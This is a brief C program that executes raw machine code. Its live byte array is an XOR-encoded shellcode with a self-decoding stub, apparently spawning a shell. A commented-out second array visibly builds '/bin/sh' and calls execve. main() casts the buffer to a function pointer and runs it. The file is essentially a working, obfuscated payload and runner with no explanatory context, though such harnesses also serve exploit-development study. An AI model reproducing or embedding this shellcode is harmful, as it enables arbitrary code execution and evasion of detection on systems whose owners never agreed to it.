
int main(int argc, char **argv)
{

  //char code_part1[] = "\x48\xb8\x48\x31\xc0\x48\x31\xd2\xeb\x04\xeb\xf6\x48\xb8\x66\xbb\x73\x68\x90\x90\xeb\x02\x48\xb8\x48\xc1\xe3\x10\x90\x90\xeb\x02\x48\xb8\x66\xbb\x6e\x2f\x90\x90\xeb\x02\x48\xb8\x48\xc1\xe3\x10\x90\x90\xeb\x02\x48\xb8\x66\xbb\x62\x69\x90\x90\xeb\x02\x48\xb8\x48\xc1\xe3\x08\xb3\x2f\xeb\x02\x48\xb8\x53\x52\x90\x90\x90\x90\xeb\x02\x48\xb8\x48\x8d\x7c\x24\x08\x57\xeb\x02\x48\xb8\x48\x89\xe6\xb0\x3b\x90\xeb\x02\x48\xb8\x0f\x05\x48\x31\xc0\x90\xeb\x02\x48\xb8\xb0\x3c\x48\x31\xff\x90\xeb\x02";
  
  char code[]="\x4d\x31\xc0\x41\xb1\xa5\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb"
			"\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48"
			"\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\xed\x1d\xed\x94\x65\xed"
			"\x94\x77\x4e\xa1\x4e\x53\xed\x1d\xc3\x1e\xd6\xcd\x35\x35\x4e"
			"\xa7\xed\x1d\xed\x64\x46\xb5\x35\x35\x4e\xa7\xed\x1d\xc3\x1e"
			"\xcb\x8a\x35\x35\x4e\xa7\xed\x1d\xed\x64\x46\xb5\x35\x35\x4e"
			"\xa7\xed\x1d\xc3\x1e\xc7\xcc\x35\x35\x4e\xa7\xed\x1d\xed\x64"
			"\x46\xad\x16\x8a\x4e\xa7\xed\x1d\xf6\xf7\x35\x35\x35\x35\x4e"
 			"\xa7\xed\x1d\xed\x28\xd9\x81\xad\xf2\x4e\xa7\xed\x1d\xed\x2c"
			"\x43\x15\x9e\x35\x4e\xa7\xed\x1d\xaa\xa0\xed\x94\x65\x35\x4e"
			"\xa7\xed\x1d\x15\x99\xed\x94\x5a\x35\x4e\xa7";


  int (*func)();

  func = (int (*)()) code;

  (int)(*func)();

}